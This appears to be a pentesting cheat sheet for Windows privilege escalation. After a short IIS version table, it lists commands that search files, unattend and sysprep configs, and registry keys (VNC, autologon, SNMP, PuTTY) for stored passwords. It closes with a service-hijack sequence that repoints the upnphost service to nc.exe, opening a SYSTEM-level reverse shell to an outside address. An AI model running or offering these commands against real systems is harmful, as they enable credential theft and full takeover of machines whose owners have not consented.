# IIS CHART VERSION
|IIS VERSION | OS|
|--------|---|
| 5.1	|	Windows XP Professional
| 6.0	|	Windows Server 2003
| 7.0	| Windows Vista and WIndows Server 2008
| 7.5	|	Windows 7 and Windows Server 2008 R2
| 8.0	| Windows 8 and Windows Server 2012
| 8.5 | Windows Server 2012 R2 and Windows 8.1
|10.0 | Windows Server 2016 and Windows Server 2019 

# Clear Text Passwords
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

# In files
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
# In Register
```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

# Change the upnp service binary
```
sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
```
